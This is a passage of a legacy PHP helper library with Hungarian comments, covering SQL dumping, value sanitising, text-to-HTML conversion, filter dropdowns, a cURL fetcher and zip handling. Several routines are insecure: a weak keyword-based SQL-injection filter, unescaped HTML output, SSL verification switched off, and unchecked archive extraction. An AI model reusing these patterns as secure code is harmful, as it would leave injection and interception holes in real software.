                    echo 'INSERT INTO `'.$table.'` VALUES(';
                } else {
                    $insert_sql .= 'INSERT INTO `'.$table.'` VALUES(';
                }
                
                $resz_sql = '';
                for($n=1; $n<=$num_fields; $n++){
                    $m = $n - 1;
                    $insert_sql .= '\''.mysql_real_escape_string($fetch_row[$m]).'\', ';
                    $resz_sql   .= '\''.mysql_real_escape_string($fetch_row[$m]).'\', ';
                }
                
                if($kiir){
                    $resz_sql = substr($resz_sql, 0, -2);
                    echo $resz_sql .= ');'."\r\n";
                } else {
                    $insert_sql = substr($insert_sql, 0, -2);
                    $insert_sql .= ');'."\r\n";
                }
            }
            if ($insert_sql){
                if($kiir){
                    echo "\r\n";
                } else {
                    $SQL[] = $insert_sql;
                }
            }
        }
    }
    
    if(!$kiir){
        return implode("\r\n", $SQL);
    }
}

/**
*	@desc Az SQL injection ellen véd
*		Kiszrűri minden <tag></tag> alakot és a közte lévő tartalmat is
*		Továbbá ellenőrzi, hogy az SQL-ben felhasznált idézőjelek is '\'-jellel meg legyenek előzve
*
*	@param string  Az érték string
*	@param boolean Ha igaz, akkor megengedi a <tag>-ek használatát, alapértelmezetten hamis
*/
function sql_ertek($ertek, $script=false){
    
    global $adatbazis_kapcsolat;
    
    $ertek_kicsi = strtolower($ertek);
    if(strpos($ertek_kicsi, 'sleep(')!==false){
        $ertek = '';
    }
    
    while(strpos($ertek, '--')!==false){
        $ertek = str_replace('--', '-', $ertek);
    }

	if(get_magic_quotes_gpc()){
        $ertek = stripslashes($ertek);
	}
	
	if(!is_numeric($ertek)){
        $ertek = str_replace(
                            array('\n', '\r', '\"'/*CSV-be mentés (pl. szótár) miatt*/),
                            array("\n", "\r", '"'),
                            mysqli_real_escape_string($adatbazis_kapcsolat -> adatbazis_kapcsolat, $ertek) );
    }
	
//	if(!$script){
//		$ertek = notags($ertek);
//	}
	return $ertek;
}

/** String => HTML      
 * @desc Egy stringból készítünk HTML forrást, a gyorsabb és könnyebb kódolásért. A szabályok alapvetően a Wikipedia mintájára készültek, de nem teljesek.
 * Belső formázásokat továbbra is HTML kód megadásával kell meadni (pl. félkövérítés, aláhúzás), hisze erre megvannak a gyorsbillentyűk a szövegszerkesztőben,
 * macerásabb kódolni.
 * @param $string Az előformázott szöveg a fenti szabályokkal
 * @param $kep_szelesseg A felismert képek maximum szélessége (kicsinyítéshez)
 * @param $ne_linkesits Ne ismerje fel a http:// hivatkozásokat
 * @param $ujsor Ha nem szeretnénk, hogy egysoros legyen, akkor ide megadható a "\r\n" mint paraméter
 *
 * @return$string Az előformázott szöveg a fenti szabályokkal
 *
 * PÉLDÁK

Táblázat:
 
!11|!12|!13|!14|!15|!16
21|22|23|23|25|26
31|32|33|33|35|36

(Az első sor <th>-s, mert feliáltójellel kezdődik)

Lista:
#első sor
#második sor
#....


Fejlécek:

!H1 fejléc
!!H2 fejléc
!!!H3 fejléc
!!!!H4 fejléc
!!!!!H5 fejléc
!!!!!!H6 fejléc

Paragrafusok: 
Az összes többi sort egy <p>-be teszi. Egy sortürésből <br /> lesz, dupla sortörésből (üres sorból!) pedig </p><p>, azaz úgy paragrafus. Két üres sor esetén pedig <p>&nbsp;</p>-vel készít újsorokat.
 */
function string2html($string, $kep_szelesseg = 200, $ne_linkesits = false, $ujsor = ''){
    
    $html = '';
	$lista_nyitva    = false;
    $tablazat_nyitva = false;
    
    $string = trim($string);
	if($string){
	   
        //Képek felismerése {kep_eleresi_utvonala|alt_ja}
        $mivel = array();
        preg_match_all('/\{[^\}]*\}/', $string, $kepek);
        $mit = $kepek[0];
        foreach($mit as $elem){
            if(!$ne_linkesits){
                $elem = str_replace('http://', '', $elem); //Levesszük a http://-t mert azt a következő lépésben linkké alakítaná a scriptünk
            }

            $elem = str_replace(array('{', '}'), array('', ''), $elem);
            list($kep, $alt) = split('\|', $elem);
            $kep = trim($kep);
            $alt = trim( strip_tags($alt) );

            $kep_html = '';

            if(is_file($kep)){
                $kep_html = new Img($kep, $alt, $kep_szelesseg);
                $kep_html = $kep_html -> getHtml();
            }
            
            array_push($mivel, '<a class="light" href="'.get_alk().$kep.'">'.$kep_html.'</a>');
        }
        $string = str_replace($mit, $mivel, $string);
        
        //Kapcsos zárójel átírása
        $string = str_replace(array('{', '}'), array('&#123;', '&#125;'), $string);
        
        //Sorok bejárása
		$sorok = explode("\n", $string);
		
		$i = 0;
        $uressor_volt = false; //Megnézzük, hogy az előző sor üres volt-e (ha kétszer egymás után üres, akkor <p>&nbsp;</p>-ket kell gyártani)
		foreach($sorok as $sor){
		    
            $sor = trim($sor);
			
            if($sor){
                
                //Ha van tartalma, akkor ez nem üres sor
                $uressor_volt = false;
			    
    		    //Táblázatról van-e szó (van-e benne "|" karakter)?
    		    if(strstr($sor, '|')){
                    if(!$tablazat_nyitva){
                        $html .= $ujsor.'<table>'.$ujsor;
                        $tablazat_nyitva = true;
                    }
                } else {
                    if($tablazat_nyitva){
                        $html .= '</table>'.$ujsor;
                        $tablazat_nyitva = false;
                    }
                }
                
                //Listáról van-e szó
                if(substr($sor,0,1) == '#'){
                    if(!$lista_nyitva){
                        $html .= $ujsor.'<ul>'.$ujsor;
                        $lista_nyitva = true;
                    }
                } else {
                    if($lista_nyitva){
                        $html .= '</ul>'.$ujsor;
                        $lista_nyitva = false;
                    }
                }
			    
			    //Ha táblázat
			    if($tablazat_nyitva){
                    $html .= '<tr>'.$ujsor;
    				
                    $oszlopok = explode('|', $sor);
    				foreach($oszlopok as $oszlop){
    				    $oszlop = trim($oszlop);
    				    if( substr($oszlop,0,1) == '!' ){
                            $html .= '<th class="t'.($i%2).'">'.substr($oszlop,1,strlen($oszlop)).'</th>'.$ujsor;
                        } else {
                            $html .= '<td class="t'.($i%2).'">'.$oszlop.'</td>'.$ujsor;
                        }
    				}
    				$html .= '</tr>'.$ujsor;
                
                //Listák
                }elseif($lista_nyitva){
                    
                    $html .= '<li>'.substr($sor,1,strlen($sor)).'</li>'.$ujsor;
                    
                } else {
                    
                    //Címsorok
                    if(      substr($sor,0,6) == '!!!!!!' ){
                        $html .= $ujsor.'</p><h6>'.substr($sor,6,strlen($sor)).'</h6><p>'.$ujsor;
                    }elseif( substr($sor,0,5) == '!!!!!' ){
                        $html .= $ujsor.'</p><h5>'.substr($sor,5,strlen($sor)).'</h5><p>'.$ujsor;
                    }elseif( substr($sor,0,4) == '!!!!'  ){
                        $html .= $ujsor.'</p><h4>'.substr($sor,4,strlen($sor)).'</h4><p>'.$ujsor;
                    }elseif( substr($sor,0,3) == '!!!'   ){
                        $html .= $ujsor.'</p><h3>'.substr($sor,3,strlen($sor)).'</h3><p>'.$ujsor;
                    }elseif( substr($sor,0,2) == '!!'   ){
                        $html .= $ujsor.'</p><h2>'.substr($sor,2,strlen($sor)).'</h2><p>'.$ujsor;
                    }elseif( substr($sor,0,1) == '!'    ){
                        $html .= $ujsor.'</p><h1>'.substr($sor,1,strlen($sor)).'</h1><p>'.$ujsor;
                    } else {
                        $html .= '<br>'.$sor.$ujsor;
                    }
                }
    				
				$i++;
			
            //Üressorból sortörést kell készíteni
            } else {
                //Ha már az előző ciklusban is üres sor volt, akkor teszünk bele egy &nbsp;-t, ebből így <p>&nbsp;</p>-k fognak keletkezni
                if($uressor_volt){
                    $html .= '&nbsp;';
                }
                $html .= '</p><p>';
                $uressor_volt = true;
			}
		}
        if($tablazat_nyitva){
            $html .= '</table>'.$ujsor;
            $tablazat_nyitva = false;
        }
        if($lista_nyitva){
            $html .= '</ul>'.$ujsor;
            $lista_nyitva = false;
        }
	}

    if(!$ne_linkesits){
	   $html = preg_replace('%\b(([\w-]+://?|www[.])[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|/)))%s', '<a href="$1">$1</a>', $html);
    }
    
    $html = '<p>'.$html.'</p>';
    $html = str_replace('<p></p>', '', $html);
    return $html;
}



/**
* Szűkítés
*
* @param array $akt_tomb: Az aktuálsi tömb, mely szerint generálunk
* @param string $megnevezes: Az oszlop neve
* @param string $felirat: Felirat
* @param string $where: where feltétel
*
* @return string $return az elkészített HTML forrás
*/
function szukites($akt_tomb, $megnevezes, $felirat = 'Szűkítés', $where = '', $kulso_tabla = ''){
    
    global $db_kapcs;
    
    $return = '';

	$van_szukitendo = false;
	foreach($akt_tomb as $ertek){
		if($ertek['szukit']){
			$lekerdez = mysqli_query($db_kapcs, 'SELECT DISTINCT `'.$ertek['name'].'` FROM `'.get_db_tabla().$megnevezes.'`'.$where);
			if(mysqli_num_rows($lekerdez)>1){
				$van_szukitendo = true;
				break;
			}
		}
	}
	
	if($van_szukitendo){
	    
		$return .= '<div class="sav"> '.$felirat.': ';
			
			foreach($akt_tomb as $ertek){
				if($ertek['szukit']){
                    
                    $return .= $ertek['megn'].' ';
				    $return .= '<select name="'.$ertek['name'].'" onchange="szurkit(); location.href=\''.self().get_get(array($ertek['name'], 'unset')).'&amp;'.$ertek['name'].'=\'+this.value"><option value="">-Összes-</option>';
					
                    if($ertek['szukit_tabla']){
                        list($tabla, $oszlop) = explode('|', $ertek['szukit_tabla']);
                        if(!$oszlop){
                            $oszlop = 'nev';
                        }
                        
                        $idk = array();
                        $lekerdez  = mysqli_query($db_kapcs, 'SELECT DISTINCT `'.$ertek['name'].'` FROM `'.get_db_tabla().$megnevezes.'`'.$where);
                        while($lek = mysqli_fetch_assoc($lekerdez)){
                            if($lek[$ertek['name']]){
                                array_push($idk, $lek[$ertek['name']]);
                            }
                        }
                        if($idk){
                            $lekerdez  = mysqli_query($db_kapcs, 'SELECT `id`, `'.$oszlop.'` FROM `'.get_db_tabla().$tabla.'` WHERE `id` IN (\''.implode('\', \'', $idk).'\') ORDER BY `'.$oszlop.'`');
                            while($sor = mysqli_fetch_assoc($lekerdez)){

                                $return .= '<option';
                                if($sor['id'] == $_GET[$ertek['name']]){
                                    $return .= ' selected="selected"';
                                }
                                $return .= ' value="'.$sor['id'].'">'.$sor[$oszlop].'</option>';
                            }
                        }
                        
                    } else {
                        
                    
                        $lekerdez  = mysqli_query($db_kapcs, 'SELECT DISTINCT `'.$ertek['name'].'` FROM `'.get_db_tabla().$megnevezes.'`'.$where.' ORDER BY `'.$ertek['name'].'`');
                        while($sor = mysqli_fetch_row($lekerdez)){

                            $nev = $sor[0];

                            $return .= '<option';
                            if($sor['0'] == $_GET[$ertek['name']]){
                                $return .= ' selected="selected"';
                            }
                            $return .= ' value="'.$sor['0'].'">'.$nev.'</option>';
                        }
                    }
					
				    $return .= '</select>';
				}
			}
			
		$return .= '</div>';
	}
	
	return $return;
}

/**
*	Thumbnail kép-e a megadott fájnév? Azaz a fájlnév _{SZEL}x{MAGAS}.kit alakú-e ahol a magasság akár üres is lehet
*   A függvény azt vizsgálja, hogy a '_' karakter utáni részben szerepel-e 'x', és ha igen akkor a '_' és 'x' karaktereket
*   kiszűrve csak számot kapunk-e eredményül
* 
*	@param string $kep_file_nev: egy fájl neve
*
*	@return bool: igaz, ha egy thumbnail, egyébként hamis
*/
function thumbnail_kep_e($kep_file_nev){
    $thumbnail = pathinfo($kep_file_nev);
    $thumbnail = $thumbnail['filename'];
    $thumbnail = substr($thumbnail, strrpos($thumbnail, '_'));
    if(preg_match('/^_[0-9]*x[0-9]*$/', $thumbnail)){
        return true;
    }
    return false;
}

/**
* Tömbből option-ok. Lényeges, hogy a select HTML tagpár és az adatábis lekérdezés nem része a függvénynek
* 
* Pl:
* $html   = '<select name="valami" id="valami" onchange="valami">';
* $html  .= '<option value="">-Válassz-</option>';
* $valami = $adatbazis_kapcsolat -> s('*', 'valami');
* $html  .= tomb2option($valami, $ertek, $megn, 'akt_ertek');
* $html  .= '</select>';
*
* @param array $tomb: Az adatbázisból lekért tömb ($adatbazis_kapcsolat)
* @param ertek $ertek: A tömb melyik "oszlopa" tartalmazza az értéket 
* @param megn  $megn: A tömb melyik "oszlopa" tartalmazza a megnevezést
* @param selected $selected: melyik érték lesz a selected
*
* @return string $return az elkészített HTML kód
*/
function tomb2option($tomb, $ertek, $megn, $akt_ertek = ''){
    
    $html = '';
	foreach($tomb as $elem){
        $selected = '';
        if($elem[$ertek] == $akt_ertek){
            $selected = ' selected="selected"';
        }
        $html .= '<option'.$selected.' value="'.$elem[$ertek].'">'.$elem[$megn].'</option>';
	}
	
	return $html;
}


/**
* @desc WebDeb statisztika a kódokról (fájlok száma, sorok és karakterek száma)
* 
* @return string Egy sima HTML tartalom a statisztikáról
*/
function WebDeb_stat(){
    
    $kivetelek = array('!DATA', '!MODULOK', 'elemek', 'nbproject', basename(get_utvonal()));
    $szoveges_fajlok = array('php', 'css', 'js', 'html');
    
    $html .= '';
    
    $fajlok = konyvtar_bejar(dirname(__FILE__), $kivetelek);
    
    $fajlok_szama               = array();
    $sorok_szama                = array();
    $szavak_szama               = array();
    $karakterek_szama           = array();
    
    foreach($fajlok as $file){
        
        $kit = kit($file);
        
        if(in_array($kit, $szoveges_fajlok)){
            
            $fajl_tartalma = file_get_contents($file);
            
            $sorok                           = count(explode("\n", $fajl_tartalma));
            $sorok_szama['ossz']            += $sorok;
            $sorok_szama[$kit]              += $sorok;
            
            $szavak                          = str_word_count($fajl_tartalma);
            $szavak_szama['ossz']           += $szavak;
            $szavak_szama[$kit]             += $szavak;
            
            $karkter                         = strlen($fajl_tartalma);
            $karakterek_szama['ossz']       += $karkter;
            $karakterek_szama[$kit]         += $karkter;
            
            $fajlok_szama['ossz']++;
            $fajlok_szama[$kit]++;
            
        }

    }
    
    $html .=    'Fájlok száma: '          .number_format($fajlok_szama['ossz'],             0, '', '.').'<br />'.
                'Sorok száma: '           .number_format($sorok_szama['ossz'],              0, '', '.').'<br />'.
                'Szavak száma: '          .number_format($szavak_szama['ossz'],             0, '', '.').'<br />'.
                'Karakterek száma: '      .number_format($karakterek_szama['ossz'],         0, '', '.').'<br /><hr />';
    
    foreach($szoveges_fajlok as $kit){
        $html .= strtoupper($kit).' fájlok száma: '          .number_format($fajlok_szama[$kit],             0, '', '.').'<br />'.
                 strtoupper($kit).' sorok száma: '           .number_format($sorok_szama[$kit],              0, '', '.').'<br />'.
                 strtoupper($kit).' szavak száma: '          .number_format($szavak_szama[$kit],             0, '', '.').'<br />'.
                 strtoupper($kit).' karakterek száma: '      .number_format($karakterek_szama[$kit],         0, '', '.').'<br /><hr />';
    }
    
    return $html;
}


/**
* @desc URL letöltése - curl-t használ hozzá
* 
* @param strinig $url: az URL címe
* 
* @return string Az URL tartalma, amit letöltüttünk
*/
function URL_letolt($url){
    // is curl installed?
    if (!function_exists('curl_init')){ 
        die('CURL nincs telepítve!');
    }
    
    // create a new curl resource
    $ch = curl_init();
    
    /*
    Here you find more options for curl:
    http://www.php.net/curl_setopt
    */
    
    // set URL to download
    curl_setopt($ch, CURLOPT_URL, $url);
    
    // set referer:
    curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com/");
    
    //Ha figyeljek, hogy SSL helyes-e
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    // user agent:
    curl_setopt($ch, CURLOPT_USERAGENT, "MozillaXYZ/1.0");
    
    // remove header? 0 = yes, 1 = no
    curl_setopt($ch, CURLOPT_HEADER, 0);
    
    // should curl return or print the data? true = return, false = print
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // timeout in seconds
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    // curl_setopt($ch, CURLOPT_VERBOSE, true);
    
    // download the given URL, and return output
    $output = curl_exec($ch);
    
    // close the curl resource, and free system resources
    curl_close($ch);
    
    // print output
    return $output;
}


/**
* @desc ZIP készítése egy tömbből
* 
* @param array $fajlok tömörítendő fájlokból egy tömb VAGY egy mappa elérési útvonala
* @param string $celfajl a célfájl neve
* 
* @return boolean Létrejött-e a célfájl
*/
function zip_becsomagol($fajlok = array(), $celfajl = ''){
	
    //Ha a fájlokat tartalmazó tömb valójában egy könyvtár útvonala, akkor bejárjuk a könytárat az alkönyvtárakkal együtt
    if(is_dir($fajlok)){
        $fajlok = konyvtar_bejar($fajlok);
    }
    
    //Csak létező fájlokat csomagolunk
	$valodi_fajlok = array();
	if(is_array($fajlok)){
		foreach($fajlok as $file){
			if(file_exists($file)){
				$valodi_fajlok[] = $file;
			}
		}
	}

    //Tömörítés
	if(count($valodi_fajlok)) {
		$zip = new ZipArchive();
		if($zip -> open($celfajl, true ? ZIPARCHIVE::OVERWRITE : ZIPARCHIVE::CREATE) !== true){
			return false;
		}
		
		foreach($valodi_fajlok as $file) {
			$zip -> addFile($file,$file);
		}
		
		$zip -> close();
		
		return file_exists($celfajl);
	
    } else {
	   
		return false;
	}
}

/**
* @desc ZIP kicsomagolása
* 
* @param string $zip_fajl a fájl elérési útvonala
* @param string $celkonyvtar a célkönyvtár neve
* @param array $fajlokat itt át lehet adni, hogy csak bizonyos fájlokkal tegye meg
*  
* @return boolean Llétrejött-e a célfájl
*/
function zip_kicsomagol($zip_fajl, $celkonyvtar, $fajlokat = array()){
    
    $zip = new ZipArchive;
    
    if ($zip -> open($zip_fajl) === TRUE) {
        
        if($fajlokat){
            $zip -> extractTo($celkonyvtar, $fajlokat);
        } else {
            $zip -> extractTo($celkonyvtar);
        }
        
        $zip -> close();
        return true;
        
    } else {
        
        return false;
        
    }
}
?>